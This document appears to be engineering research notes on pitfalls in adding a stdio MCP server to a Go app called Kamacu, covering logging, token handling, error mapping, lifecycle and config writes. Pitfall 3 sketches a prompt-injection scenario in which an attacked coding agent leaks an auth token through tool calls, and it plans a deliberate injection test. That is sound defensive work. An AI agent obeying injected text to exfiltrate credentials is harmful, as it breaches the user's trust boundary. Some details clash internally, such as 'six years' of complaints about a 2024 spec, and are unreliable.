# Pitfalls Research

**Domain:** Adding an MCP server (`kamacu mcp serve`, stdio) to Kamacu — an existing Go 1.26 app serving HTTP + WS at localhost with a stdlib-only ethos
**Researched:** 2026-07-21
**Confidence:** HIGH (MCP spec + Go SDK source verified line-by-line; agent-CLI quirks verified against Anthropic's published Claude Code MCP docs; security pitfalls cross-checked against Palo Alto Unit 42 PoCs and Practical DevSecOps 2026 review; the bridge-to-HTTP and lifecycle pitfalls are grounded in the existing Kamacu codebase `internal/session`, `internal/api/hooks.go`, `internal/opencode`)

> **Scope note.** These pitfalls are specific to *adding an MCP server to an existing Go app* — not general Go or general MCP advice. They assume Kamacu v1.11 as the target: a `kamacu mcp serve` stdio subcommand spawned by an agent CLI (Claude Code, opencode) inside a Kamacu task PTY, bridging to the existing HTTP API at `127.0.0.1:7333` with the `KAMACU_HOOK_TOKEN` envelope. The agent-CLI registration pitfalls also apply because v1.11 plans to write `mcpServers` entries into `~/.claude.json` / `opencode.json` at spawn. Phase IDs (MCP-1..MCP-n) are placeholders — the roadmap should map them onto the v1.11 Active requirements.
>
> **Precedent in this file.** The token-handling patterns (constant-time compare, never persist, never log, mint fresh per server start) come from `internal/api/hooks.go` and `cmd/kamacu/main.go`'s existing `hookToken` — the MCP server must not regress them. The agent-CLI plugin install patterns (silent skip on absent dir, write-if-absent, `// kamacu-managed` header) come from `internal/opencode/plugin.go` — the MCP `mcpServers` injection must follow the same no-pollution discipline.

---

## Critical Pitfalls

### Pitfall 1: Stdout pollution corrupts the JSON-RPC stream (the #1 way MCP servers die)

**What goes wrong:**
MCP stdio transport is newline-delimited JSON-RPC: every byte the server writes to `stdout` is consumed by the agent CLI's protocol parser. Any non-JSON byte on stdout — a stray `fmt.Println("hello")`, a panic stack trace, a Go default logger line, a library that logs to stdout, an `exec.LookPath` diagnostic, a `log.Fatalf` from a goroutine — desynchronizes the stream. After the first polluted write, every subsequent message fails to parse, and the agent CLI tears down the connection (often with no useful error to the user). The MCP spec is unambiguous: *"The server MUST NOT write anything to its stdout that is not a valid MCP message"* (modelcontextprotocol.io/specification/2025-06-18/basic/transports). The community has built a standalone CLI — `mcp-stdio-guard` — whose entire purpose is to catch this class of bug. This is the single highest-probability bug class in any new MCP server.

**Why it happens:**
Go's defaults fight this hard. `log.Println`, `log.Fatal`, `fmt.Println`, panic traces, and the `runtime` debug output all go to **stdout** (or stderr — see Pitfall 2) by default, not a captured sink. A new subcommand dropped into `cmd/kamacu/main.go` inherits the parent's `os.Stdout` unless it explicitly redirects. Third-party libraries (sqlite, pty, http internals) can write to stdout on edge cases. Even a `defer fmt.Println("shutdown")` planted "temporarily" for debugging ships to production.

**How to avoid:**
- **Redirect stdout from line zero of `kamacu mcp serve`.** The MCP server's stdout belongs to the protocol — the entire program. Before any other code runs (including flag parsing that might error), wrap stdout: `os.Stdout = os.NewFile(0, "")` is wrong (it's already stdin/stdout); instead capture the real stdout for the SDK and replace `os.Stdout` with `os.Stderr` so any stray print lands on stderr, not the protocol stream.
- **Pin every logger to stderr.** The Kamacu app already uses `log/slog`; the MCP subcommand must construct its own `slog.Logger` with `slog.NewTextHandler(os.Stderr, nil)` and pass it down. Never `slog.New(slog.NewTextHandler(os.Stdout, …))`. The Go SDK's `ServerOptions.Logger` defaults to a stderr handler (`ensureLogger(nil)`) — confirm Kamacu's instance overrides correctly.
- **Configure the Go SDK's `LoggingTransport` to write to `os.Stderr`, not stdout.** The SDK ships `mcp.LoggingTransport{Transport: t, Writer: w}` for protocol-level debugging; point `w` at stderr or a file. The default in the SDK examples writes to a `bytes.Buffer`, which is fine for tests but useless in production.
- **Intercept panic + crash output.** A recovered panic in a tool handler is contained by the SDK (returns as a JSON-RPC error). A panic in the main goroutine or a background goroutine bypasses the SDK and writes a stack trace to stderr (good) — but if anything ever moves the sink, this regresses. Add a `defer recover()` at the top-level that logs to stderr and exits non-zero, so the agent CLI sees a clean shutdown instead of a half-corrupted stream.
- **Ban `fmt.Print*` from the subcommand's package.** A grep in CI: `rg -n 'fmt\.Print|log\.Print|log\.Fatal' ./cmd/kamacu/mcp/` should return zero hits (or only hits that go through stderr explicitly).
- **Run `mcp-stdio-guard` in the test loop.** It exists specifically to catch this; integrate it as a CI step that runs `kamacu mcp serve` against a fake client and asserts stdout contains only JSON lines.

**Warning signs:**
- Agent CLI reports "MCP server sent malformed output" / "Connection closed" / "Failed to parse" within seconds of spawning `kamacu mcp serve`.
- `/mcp` panel in Claude Code shows the server as `failed` after every restart; works briefly when logging is disabled.
- Tests pass (no real stdout consumer) but the live agent CLI connection dies on the first tool call.
- Stderr logs from the MCP subcommand appear in the agent CLI's MCP log (that's correct), but agent CLI's protocol log shows non-JSON bytes interleaved.

**Phase to address:** MCP-1 (subcommand skeleton + transport wiring). Add a regression test in this phase: spawn the subcommand, write a malformed tool that calls `fmt.Println("debug")`, assert the SDK returns a clean JSON-RPC error rather than crashing the connection. The whole class is preventable at the `os.Stdout` redirect cost.

---

### Pitfall 2: stderr ambiguity across agent CLIs (the silent failure mode)

**What goes wrong:**
The MCP spec says *"The server MAY write UTF-8 strings to stderr for logging purposes. Clients MAY capture, forward, or ignore this logging."* — and then says nothing about *how clients should interpret stderr*. Different clients interpret it differently. The canonical community complaint (modelcontextprotocol/specification issue #177): Roo (a Claude Code derivative) treats *any* stderr output as a sign the server is malfunctioning and surfaces a noisy "MCP server has problems" banner for benign INFO-level logs. Other clients capture + display stderr only on exit. langchain4j logs all MCP messages at ERROR level on stderr by default. The practical effect: a Kamacu MCP subcommand that emits a routine startup `slog.Info("kamacu mcp listening")` to stderr can trigger a "broken server" banner in some agent CLIs while working perfectly in others.

**Why it happens:**
The spec punted on stderr semantics. Some agent CLIs read stderr as "the server's diagnostics channel" (forward, display, ignore). Others read it as "the server's error channel" (any output = error). The MCP repo's own `kagi MCP server` complaint thread is a server author being told "your benign logs are causing a false alarm" — six years of similar complaints later, the spec still hasn't pinned this down.

**How to avoid:**
- **Default the MCP subcommand logger to WARN level.** Kamacu's HTTP server logs `slog.Info` freely because its stdout (the SPA / API) is harmless. The MCP subcommand cannot — its stdout is the protocol, and its stderr is interpreted inconsistently. Pick `slog.LevelWarn` for the subcommand by default (override via `--log-level` or `KAMACU_MCP_LOG_LEVEL` for debugging).
- **Sink stderr to a file by default, mirror to stderr only on error.** The existing Kamacu pattern (`internal/migrate`, `internal/store`) writes structured logs to a file under `~/.kamacu/logs/`. Adopt it for the MCP subcommand: `os.Stderr` shows only WARN+, a rotating log file captures DEBUG+. A user debugging can `tail -f` the file without any agent CLI seeing chatter.
- **Never write panic stack traces to stderr without also surfacing a clean JSON-RPC error.** A bare panic trace on stderr may trigger the "broken server" banner AND fail to inform the agent of the cause. Use `recover()` to translate panics in tool handlers into JSON-RPC error responses (the SDK does this if configured correctly), and write the trace only to the log file.
- **Document the chosen posture in the SDK handshake `instructions` field.** The Go SDK's `ServerOptions.Instructions` is sent to the client during initialization. If the agent CLI surfaces it, the user sees "this server logs to ~/.kamacu/logs/mcp.log; warnings and errors on stderr" — a clear contract.

**Warning signs:**
- Agent CLI shows a persistent "MCP server has problems" banner despite tools working correctly.
- Stderr logs from the subcommand appear in the agent CLI at INFO level with an error-styled icon.
- After a routine INFO log, the agent CLI disconnects and reconnects (some clients reconnect on perceived error conditions).

**Phase to address:** MCP-1 (subcommand skeleton) configures the logger; MCP-n (polish / hardening) verifies against multiple agent CLIs (Claude Code + opencode minimum).

---

### Pitfall 3: The KAMACU_HOOK_TOKEN leaks via tool output, logs, or error messages

**What goes wrong:**
The MCP subcommand inherits `KAMACU_SESSION_ID`, `KAMACU_HOOK_TOKEN`, `KAMACU_HOOK_BASE` from the agent CLI's environment (the same D014 env contract opencode already uses). The token is the same per-server-instance envelope `internal/api/hooks.go` checks via constant-time compare — the entire app's auth model. If any tool output, error string, log line, or panic trace includes the token, the agent (which IS the LLM) ingests it into its context window. From there: prompt-injection-style attacks (Pitfall 9) can exfiltrate it via subsequent tool calls; a compromised or buggy downstream tool (e.g. a `bash` tool from a different MCP server) can read the env var directly; a copy-paste of "show me the error" to a collaborator leaks it. This is a privilege boundary breach: the token's whole point is that the server mints and checks it; the MCP subcommand must never give the agent a way to learn it.

**Why it happens:**
Three common code shapes leak credentials: (1) `log.Printf("connecting to %s with token %s", url, token)` — the "helpful" debug log; (2) error wrapping that includes the failing request, including its headers: `fmt.Errorf("POST /api/hooks failed: %w (sent: %s)", err, reqDump)`; (3) tool results that introspect environment or config — a `kamacu.debug.env` tool or a `kamacu.system.info` tool that returns "what the server sees". A subtler leak: the agent CLI may dump the spawned child's env to its logs (some do, for debugging), and the token lands in the agent's own log file.

**How to avoid:**
- **The token never enters tool code.** Hold it in a single struct (`mcp.bridge{ token string }`) constructed once at startup; never pass it to tool handlers, never embed it in any returned value, never include it in any error. The MCP subcommand uses it only when constructing outbound HTTP requests to the Kamacu API — the same pattern as `internal/session/agent.go`'s `buildOverlayJSON` (embeds token in the curl command line for claude — that's a different trust model) and `internal/opencode/kamacu-status.js` (reads from env per request — also a different model, opencode's plugin runtime is sandboxed JS). For the MCP bridge, **store the token in process memory only, never in a tool's closure that the agent could observe.**
- **Redact in logs.** Add a slog handler that scrubs the token from any field whose value matches it: `ReplaceAttr` that runs `strings.ReplaceAll(stringVal, token, "<redacted>")`. This is defense in depth — even if a `slog.Info("config", "env", os.Environ())` slips through, the token is masked. Kamacu's existing quota proxy does this implicitly by never logging credentials; formalize it for the MCP subcommand.
- **Constant-time compare stays in `internal/api/hooks.go`.** Don't reimplement token checking in the MCP subcommand — the MCP subcommand doesn't check tokens; it PRESENTS one to the HTTP API. The receiver's existing `subtle.ConstantTimeCompare` is the gate. Resist any "convenience" tool like `kamacu.auth.check` that would test the token locally — it would have to read it, creating a leak surface.
- **Never return env to the agent.** No tool should expose `os.Environ()`, the resolved config, or the bridge's HTTP client config. A "show me what's wrong" affordance must redact: `kamacu.system.info` returns only `{ "kamacu_version": ..., "http_base_url": ..., "session_id": ... }` — never the token. The session ID is fine to expose (it's already in the agent's env and the agent's PTY context).
- **Document the threat model.** The v1.3 pitfalls file documented OAuth/token handling precedent explicitly; do the same here. The README / ARCHITECTURE.md note: *"The MCP subcommand holds the KAMACU_HOOK_TOKEN in process memory only. No tool output, log line, or error message may include it. A redacting slog handler is the safety net."*

**Warning signs:**
- A `kamacu.*` tool result includes the literal token (grep tests: `rg -n "$TOKEN" tool_outputs/` returns zero hits).
- Stderr log line contains a 64-char hex string matching the env var.
- An agent prompt-attack demo (Pitfall 9) successfully exfiltrates a string beginning with `KAMACU_HOOK_TOKEN=`.
- The agent CLI's own process log shows the spawned child's env, including the token.

**Phase to address:** MCP-1 (subcommand + bridge) introduces the token redactor; MCP-n (security review / hardening) verifies with a deliberate prompt-injection test that the token is not extractable via any tool surface.

---

### Pitfall 4: Bridge-to-HTTP failure modes surface to the agent as confusing JSON-RPC errors

**What goes wrong:**
The MCP subcommand is a thin proxy: every tool call becomes an HTTP request to `127.0.0.1:7333/api/...` with `X-Kamacu-Token`. Failure modes multiply: (a) the Kamacu binary isn't running (ECONNREFUSED); (b) Kamacu moved port (user passed `--addr 127.0.0.1:8000`); (c) the token was rejected (401 — Kamacu restarted, minted a fresh token, but the MCP subcommand inherited the stale one); (d) the request body was too large / hung; (e) Kamacu is saturated and the request times out; (f) the route 404s because Kamacu was downgraded (an old MCP subcommand against a newer Kamacu, or vice versa). Each of these must reach the agent as a *useful, machine-actionable* error — otherwise the agent burns turns guessing, fails silently, or, worst case, decides Kamacu doesn't exist and proceeds without it (e.g. creates a worktree with raw `git` instead of via Kamacu, bypassing the dirty-tree gate from v1.3 Pitfall 2).

**Why it happens:**
The naive implementation wraps the HTTP error: `return nil, fmt.Errorf("kamacu call failed: %w", err)`. The SDK turns this into a `CallToolResult.IsError=true` with the error string. The agent sees `"kamacu call failed: dial tcp 127.0.0.1:7333: connect: connection refused"` — descriptive for a human, useless for an LLM that needs to decide whether to retry, wait, or surface to the user. Worse, an HTTP 401 might masquerade as "kamacu call failed: 401 Unauthorized" — the agent might decide the user needs to log in (there's no log-in; the token is process-bound), burning cycles on a non-action.

**How to avoid:**
- **Map every HTTP failure to a typed MCP error code.** Define a small enum at the bridge layer: `{ "kamacu_down": "the Kamacu binary is not running; start it with 'kamacu' or ask the user to", "kamacu_port_mismatch": "KAMACU_HOOK_BASE points at port X but Kamacu is on port Y", "kamacu_token_rejected": "the per-instance token was rejected; Kamacu has restarted. Restart this task to inherit a fresh token.", "kamacu_timeout": "Kamacu took >10s to respond", "kamacu_route_404": "Kamacu doesn't recognize this endpoint; check version compatibility", "kamacu_request_too_large": "..." }`. Each becomes a JSON-RPC error with a `code`, a `message`, and structured `data` the agent can dispatch on.
- **Use a typed http.Client with explicit timeouts.** `http.Client{Timeout: 10 * time.Second}` for ordinary calls; longer (60s) for `subscribe` / long-running tools. Never the zero-value client (unbounded timeout — agent CLI will kill the call first, see Pitfall 6).
- **Distinguish "Kamacu down" from "Kamacu unhealthy."** A first-call health probe (`GET /api/healthz`) at subcommand startup catches ECONNREFUSED early and lets the subcommand emit a single `"kamacu_down"` error per tool call instead of timing out per request. Kamacu already exposes `/api/healthz` — reuse it.
- **Retry only transient failures.** 401/403/404 are NOT retried (they're configuration). 5xx and connection-reset are retried once with 250ms backoff. Never retry on `kamacu_token_rejected` — that's a "restart the task" condition.
- **Make the agent CLI's job easy.** The error string should include a one-line recovery action: `"kamacu_down: Kamacu is not running at http://127.0.0.1:7333 (KAMACU_HOOK_BASE). Start it with 'kamacu' from your shell, or ask the user to."` Agents are remarkably good at following literal instructions in error messages.

**Warning signs:**
- Agent loops retrying a tool after Kamacu has been killed (the error wasn't classified as terminal).
- Agent responds "I couldn't reach Kamacu, please check your auth" on a 401 (the error was human-formatted, not LLM-actionable).
- A single Kamacu restart mid-task breaks every in-flight tool call (no token refresh / clean error).
- Subcommand's own log shows the same ECONNREFUSED 30 times in 2 seconds (no health probe + tight retry loop).

**Phase to address:** MCP-2 (bridge layer + first tool) defines the error taxonomy; every subsequent tool-phase reuses it. The health probe + typed errors are the gate criterion for the first end-to-end "agent uses a Kamacu tool" demo.

---

### Pitfall 5: Long-running `subscribe`/`tail` tool calls leak goroutines, ignore cancellation, or block the stdio reader

**What goes wrong:**
v1.11 explicitly exposes "read + subscribe terminal access" — snapshots AND live tail. A `kamacu.session.tail` tool call can stream output for minutes (the agent watches a sibling agent work). Four classic bugs follow: (a) the subscribe goroutine outlives the tool call — the agent cancels, but Kamacu's session fan-out keeps a queued channel open forever (goroutine leak, eventually OOM); (b) the tool call never propagates `ctx.Done()` — the agent CLI kills the call after the idle timeout, but the bridge keeps streaming into a closed pipe; (c) the stdio reader is blocked waiting for the long tool call to return — other tools queue behind it (head-of-line blocking); (d) the agent CLI has a hard wall-clock limit (Claude Code: per-server `timeout`, default ~28h but idle timeout is 30 min for stdio) and kills the call mid-stream, leaving the user without the tail they asked for.

**Why it happens:**
Subscribe semantics don't fit cleanly into MCP's request-response model. The Go SDK *does* support progress notifications (`notifications/progress`, server → client, in-stream), so a long-running tool can emit progress frames while it runs — but using them well requires non-obvious plumbing. The Kamacu `Session.Attach` primitive (`internal/session/session.go:342`) already returns a buffered channel that closes on session exit; the MCP bridge needs to translate "channel receives byte chunk" into "tool emits progress notification" and translate "tool context cancelled" into "session.Detach + return final result". The Go SDK's `notifyCancellationTimeout=5s` is a hard limit on the cancellation-handshake side; if Kamacu's session doesn't unblock the channel within 5s of `ctx.Done()`, the cancellation notification fails.

**How to avoid:**
- **Two-mode tool surface: `snapshot` (synchronous) and `subscribe` (long-running).** `kamacu.session.snapshot` returns immediately with the ring-buffer contents (the existing `Session.Snapshot()`, fast). `kamacu.session.subscribe` is the long one — it MUST be opt-in (agent passes `duration_seconds` or `until_idle_seconds`, default small e.g. 60s).
- **Translate `ctx.Done()` → `session.Detach` immediately.** The tool handler's first action on context cancel must be `defer s.Detach(connID)`. Then return the buffered snapshot collected so far as the tool result (don't return an empty error — the agent gets value from the partial stream).
- **Use progress notifications, not blocking responses.** The Go SDK pattern: in the handler, spawn a goroutine that reads the session's output channel and calls `req.Session.NotifyProgress(ctx, ...)` per chunk (or batched every 200ms). The final return gives a summary; the progress notifications ARE the live tail. Claude Code's `notifications/progress` is supported and surfaced to the LLM mid-call.
- **Bound the subscribe duration server-side.** Even if the agent asks for 10 minutes, cap at the agent CLI's idle timeout (Claude Code stdio: 30 min; opencode: unknown — pick 5 min conservatively). A tool that runs 35 minutes WILL be killed; design for the kill.
- **Never block the stdio reader on a tool.** The Go SDK runs each tool handler in its own goroutine (concurrent tool calls are supported), so this is mostly automatic — BUT if the bridge holds a mutex that another tool needs (Pitfall 7), the lock-up will manifest as stdio reader starvation. Use per-session, fine-grained locks; never a single bridge-level mutex around HTTP calls.
- **Add a goroutine-leak test.** Spawn the subcommand, subscribe, cancel, wait 2s, then check `runtime.NumGoroutine()`. This pattern is what caught Kamacu's `captureOpencodeSessionAsync` Done-channel gating in v1.10 Phase 05; reuse it.

**Warning signs:**
- `runtime.NumGoroutine()` grows monotonically across subscribe/cancel cycles.
- Agent CLI reports tool as "timed out" when Kamacu is healthy.
- A second tool call hangs after a subscribe call (head-of-line blocking via shared mutex).
- The Subscribe tool returns an empty result on cancel instead of the partial stream (the agent learns nothing).

**Phase to address:** MCP-n (subscribe / live tail — the milestone's risk-center). Needs a dedicated phase with goroutine-leak + cancellation-propagation tests as gate criteria. The codebase's first long-running tool surface — explicitly NOT standard CRUD.

---

### Pitfall 6: JSON-RPC batching, protocol-version drift, and the deprecation wave (2026-07-28)

**What goes wrong:**
The MCP spec has evolved rapidly: `2024-11-05` (initial, HTTP+SSE), `2025-03-26` (last version where the protocol-version header was not required for HTTP), `2025-06-18` (removed JSON-RPC batching — arrays of messages are now rejected; introduced Streamable HTTP), `2025-11-25`, and `2026-07-28` (the imminent major release that deprecates `roots`, `sampling`, AND `logging` per SEP-2577). An MCP server built against the latest SDK can ship features the user's installed agent CLI doesn't understand (a 2026-07-28 server talking to a 2025-06-18 client), or vice versa. Three concrete failures: (a) the server emits JSON-RPC batched arrays and the client rejects them (post-2025-06-18 client) or accepts them (pre-); (b) the server expects `server/discover` (SEP-2575, new) and the client only sends `initialize` (legacy); (c) the server advertises `roots` capability and a 2026-07-28+ client treats it as deprecated / warns the user.

**Why it happens:**
The Go SDK currently supports `{2024-11-05, 2025-03-26, 2025-06-18, 2025-11-25, 2026-07-28}` (see transport.go `supportedProtocolVersions`). The SDK negotiates down to the client's version during `initialize`. But that negotiation only covers the protocol VERSION — feature-level mismatches (a server using `sampling` while the client's SDK deprecated it) still produce confusing behavior. And the `2026-07-28` deprecation wave will land mid-milestone or shortly after.

**How to avoid:**
- **Pin to the Go SDK's negotiated-version behavior; don't override.** The SDK's `Server.discover` / `initialize` paths handle version negotiation automatically. Override only if there's a specific reason; the default is correct.
- **Don't use batching.** Even though the SDK's `ioConn` has `outgoingBatch` machinery, batching was REMOVED in `2025-06-18` — the server rejects arrays once the negotiated version is `>= 20250618`. Set `outgoingBatch` cap to 0 (default). A Kamacu MCP server emitting `[{...}, {...}]\n` will be rejected by every modern client.
- **Avoid deprecated features entirely.** v1.11 doesn't need `roots` (the agent already knows the worktree via `KAMACU_SESSION_ID`), `sampling` (the agent IS the LLM — calling sampling would recurse), or `logging` (use stderr, see Pitfall 2). Building on deprecated features is technical debt the moment `2026-07-28` ships.
- **Advertise the minimum capability set.** `ServerCapabilities{ Tools: &ToolCapabilities{ListChanged: true} }` is all v1.11 needs. Skip prompts, resources, completion, subscribe — adding them is scope creep the milestone explicitly excludes. Fewer capabilities = fewer version-drift surfaces.
- **Smoke-test against multiple agent CLI versions before each release.** A test matrix: oldest-supported Claude Code, current Claude Code, current opencode. The claude-code v2.1.105 regression (issue #47677 — broke every stdio MCP server by closing stdin immediately) is the cautionary tale: a server that worked perfectly in v2.1.101 was unusable in v2.1.105 through no fault of its own.

**Warning signs:**
- Agent CLI reports "unsupported protocol version" or hangs during `initialize`.
- `tools/list` returns successfully but the agent never invokes any tool (capability mismatch).
- Server's stderr log shows "JSON-RPC batching is not supported in 2025-06-18 and later" — you're sending batches.
- User on a 2024-11-05 client reports the server "doesn't work" while current clients work fine.

**Phase to address:** MCP-1 (skeleton) pins the version + capability set; every tool-phase reuse confirms it. The version-compat smoke-test belongs in the milestone's verification gate (run against real Claude Code AND real opencode binaries — the v1.10 opencode e2e harness pattern, `//go:build opencode_e2e`, is the model).

---

### Pitfall 7: Agent-CLI config write corrupts `~/.claude.json` / `opencode.json` or pollutes global config

**What goes wrong:**
v1.11 plans to write an `mcpServers` entry into the agent CLI's config at spawn (so tools auto-discover). Six concrete ways this goes wrong, drawn from Anthropic's own published Claude Code MCP docs + the v1.10 opencode plugin precedent: (a) **global pollution** — Kamacu writes to `~/.claude.json` user scope, so every project on the user's machine gets the `kamacu` server (with a per-task token from project X — leaks across projects); (b) **config schema drift** — Kamacu writes the new field without preserving the user's existing settings (an `mcpServers` key collision, a missing `type` field that confuses newer Claudes, an env-reference like `${VAR}` that's literal because Kamacu didn't escape it); (c) **reserved name collision** — Kamacu writes a server named `workspace` / `claude-in-chrome` / `Claude Preview` / `Claude Browser` (silently skipped at load + warning); (d) **invalid name** — Kamacu uses `kamacu-mcp-server-1.2` or `kamacu.mcp` (only `[A-Za-z0-9_-]` allowed; the latter has a dot); (e) **concurrent write race** — Kamacu spawns two tasks at once, both rewrite `~/.claude.json`, last writer wins, the other task's MCP entry vanishes; (f) **no cleanup** — task ends, Kamacu process dies, the `mcpServers` entry stays forever, pointing at a `kamacu mcp serve` invocation that no longer has the right env.

**Why it happens:**
Agent CLIs treat their config file as authoritative user state. Claude Code has THREE scopes (local / project / user) precisely because writing to global is dangerous. Kamacu's existing plugin install pattern (`internal/opencode/plugin.go`) is the right precedent: it writes IF AND ONLY IF the target dir exists, never creates parent dirs, never clobbers an existing file unless byte-identical, treats write failures as warn-only. The same discipline applies to `mcpServers` entries — except `mcpServers` is JSON-shaped, so the comparison is structural, not byte-wise.

**How to avoid:**
- **Prefer project scope (`.mcp.json`) over user scope (`~/.claude.json`).** v1.11 spawns the agent inside a Kamacu task worktree; the worktree is the natural "project root" for the agent. Write `.mcp.json` there. User-scope is the wrong default — it survives the task and leaks across tasks/projects. The v1.10 opencode plugin (in `${XDG_CONFIG_HOME}/opencode/plugin/`) is global *because it's env-gated and has no per-task state* — the MCP server has per-task state (the token).
- **Use a namespaced, validated name.** `kamacu` (the literal product name) — short, lowercase, dot-free, dash-free, no reserved words. Add a per-task suffix only inside the `env`, never the name: `{ "command": "kamacu", "args": ["mcp", "serve"], "env": { "KAMACU_SESSION_ID": "...", "KAMACU_HOOK_TOKEN": "...", "KAMACU_HOOK_BASE": "..." } }`. The token travels in env, not in the name — same shape as the existing opencode spawn in `internal/session/manager.go:184`.
- **Never `${VAR}` without a default.** Claude Code expands `${VAR}` and `${VAR:-default}`; if `VAR` is unset and there's no default, the literal `${VAR}` is left in place AND a warning is logged. For `KAMACU_HOOK_TOKEN`, expansion is *required* — but it's already in the spawned child's env via Kamacu's own env injection (no `${...}` needed in the JSON). For `command`, use the literal `"kamacu"` (PATH-resolved); do NOT use `${KAMACU_BIN}` (would expand to literal if unset, breaking the server).
- **Read-modify-write with a file lock, atomically.** Read the existing JSON; unmarshal into `map[string]any`; set `mcpServers["kamacu"]` to the new entry; marshal; write to a tempfile in the same dir; `os.Rename` over the original. Never `os.WriteFile` directly — a partial write = a corrupted user config. Use `flock` (or `go-quiz/lock`) on the config file's parent dir to serialize against concurrent Kamacu tasks.
- **Cleanup at task end.** When the task transitions to Done or is deleted, Kamacu removes the `mcpServers["kamacu"]` entry from the file it wrote. (Skip if Kamacu didn't write it — respect a user-added entry.) This reuses the same read-modify-write-with-lock path. The Done-TTL reaper (existing pattern from v1.2 Phase 9) is the right hook for offline cleanup.
- **Always preserve unknown fields.** When unmarshaling into `map[string]any` and re-marshaling, unknown fields survive. Never unmarshal into a typed struct that drops fields the newer Claude Code schema added (Kamacu's struct will lag behind Claude's schema). This is the same "no clobber" discipline as `internal/opencode/plugin.go`'s byte-identical skip.
- **Idempotent writes.** If Kamacu restarts mid-task, it re-writes the same entry — the file is identical, skip the write (avoid mtime churn, avoid clobbering a user who hand-edited). The same skip-on-byte-identical check from `internal/opencode/plugin.go:88`.

**Warning signs:**
- A user reports `claude mcp list` shows the Kamacu server in every project, with a token from a specific task.
- A user's `~/.claude.json` is corrupted (unparseable) after running Kamacu.
- A user reports Kamacu tools don't load after they edited `~/.claude.json` themselves (Kamacu's read-modify-write race-conditioned against the user's edit).
- An old Kamacu task's `mcpServers` entry lingers in `.mcp.json` after the task was deleted.
- `claude mcp list` shows `kamacu` as `✘ Rejected` or `⏸ Pending approval` because the entry has `url` without `type` (wrong shape) — only happens if Kamacu wrote a remote-server shape by mistake.

**Phase to address:** MCP-3 (agent-CLI integration) owns the write path; the cleanup is part of the same phase. The test matrix: write into a populated `~/.claude.json`, write into an absent one, write concurrently from two simulated tasks, write while the user is editing, remove the entry on task Done. The test pattern from `internal/opencode/plugin_test.go` (write-if-absent, no-clobber, skip-on-identical) is the template.

---

### Pitfall 8: Process lifecycle — zombie MCP subcommands, premature stdin close, SIGTERM races

**What goes wrong:**
The agent CLI spawns `kamacu mcp serve` as a child; the child spawns HTTP requests to Kamacu; Kamacu's lifecycle is independent of both. Six failure shapes: (a) **zombie subcommand** — agent CLI exits (user killed the terminal), but `kamacu mcp serve` keeps running, holding the worktree's `KAMACU_HOOK_TOKEN` indefinitely; (b) **premature stdin close** — claude-code v2.1.105 actually had this regression (issue #47677): a fix to detect malformed output broke ALL stdio MCP servers by closing stdin immediately on spawn; Kamacu can't fix Claude but must be robust to it; (c) **orphaned after agent crash** — agent CLI segfaults, never sends the close-stdin signal, the subcommand waits forever on `stdin.Read`; (d) **SIGTERM race** — agent CLI sends SIGTERM during shutdown, Kamacu's subcommand is mid-HTTP-call to Kamacu, the call is aborted, Kamacu's session manager sees a half-completed mutation; (e) **outliving the Kamacu binary** — Kamacu is killed, the MCP subcommand keeps trying to bridge to a dead port, every tool call fails; (f) **parent-death signal** — Linux supports `PR_SET_PDEATHSIG` to auto-die when parent exits, but Go doesn't expose it cleanly and the agent CLI might re-parent the subcommand under init.

**Why it happens:**
The Go SDK's `cmd.go` `pipeRWC.Close` sequence is the canonical shutdown: close stdin → wait `TerminateDuration` (default 5s) → SIGTERM → wait → SIGKILL. The server side is expected to: read stdin EOF → finish in-flight handlers (best-effort) → exit cleanly. If the server hangs (e.g. on a slow HTTP call to Kamacu), the agent CLI escalates to SIGTERM, then SIGKILL. The race window between "stdin EOF received" and "all goroutines drained" is where bugs live. The Go SDK explicitly admits (transport.go comment): *"This leaks a goroutine if rwc.Read does not unblock after it is closed, but that is unavoidable"*. So the SDK's own read goroutine will leak on every shutdown; design for it.

**How to avoid:**
- **Treat stdin EOF as the shutdown signal.** The subcommand's main goroutine selects on `<-ctx.Done()` (from `Server.Run`) AND on a watcher that detects `os.Stdin` read returning EOF. When either fires, initiate graceful shutdown: cancel all in-flight HTTP calls (the bridge's per-request context is cancelled), call `ServerSession.Close`, return.
- **Bound shutdown to 3 seconds.** Set `cmd.go`'s `TerminateDuration` expectation: Kamacu's MCP subcommand should finish in-flight HTTP calls within 3s of stdin EOF. Use small per-call HTTP timeouts (10s) so even mid-flight calls finish within the window. If they don't, the agent CLI's SIGTERM is the right backstop.
- **Install an HTTP-client-wide context that's tied to the subcommand's lifetime.** All bridge calls use `client.Do(req.WithContext(ctx))` where `ctx` is derived from the subcommand's root context. When shutdown fires, every in-flight HTTP call gets `context.Canceled` immediately; Kamacu's HTTP handler sees the canceled request and aborts cleanly.
- **For Linux, install `PR_SET_PDEATHSIG` via `syscall.Syscall(syscall.SYS_PRCTL, ...)` in an `init()` or via a small cgo-free wrapper.** This ensures that if the agent CLI is killed with SIGKILL (no chance to close stdin), the subcommand still dies. The Go standard library doesn't expose this directly; a 5-line syscall wrapper does. (Tradeoff: doesn't work if the subcommand is re-parented under init, e.g. agent CLI daemonized itself — but that's an unusual setup.)
- **Never write state on shutdown.** The MCP subcommand is stateless (the Kamacu HTTP API holds all state); on death, nothing needs to be persisted. This is the cleanest design — resist any "let's cache the last tool result for replay" temptation.
- **Validate the shutdown path in tests.** Spawn `kamacu mcp serve`, send `SIGTERM` mid-tool-call, assert: (a) the process exits within 3s, (b) no goroutine outlives the process by more than 1s, (c) the agent CLI's MCP log shows a clean `Server session ended`, not `connection error`. Reuse the harness from `internal/opencode/e2e_test.go`.

**Warning signs:**
- `ps aux | grep kamacu` shows multiple `kamacu mcp serve` processes after closing several agent sessions.
- Subcommand's stderr log shows repeated `kamacu_down` errors after the user killed the Kamacu binary — the subcommand is still alive, retrying forever.
- Agent CLI's MCP panel shows the server as `failed` immediately after spawn (the v2.1.105 regression symptom; can't be fixed server-side but should be detected and surfaced).
- Shutdown takes >5s; the agent CLI sends SIGKILL; the next launch sees a stale state file.

**Phase to address:** MCP-1 (skeleton) sets up the basic lifecycle; MCP-n (hardening) installs `PR_SET_PDEATHSIG` + the shutdown timeout + the leak test. This is non-negotiable for a process spawned per-task — without it, every task leaks a process.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Wrap HTTP error as `fmt.Errorf("kamacu: %w", err)` | One line of code | Agent can't act on error; burns turns guessing; may bypass Kamacu (Pitfall 4) | **Never** — typed errors from day one |
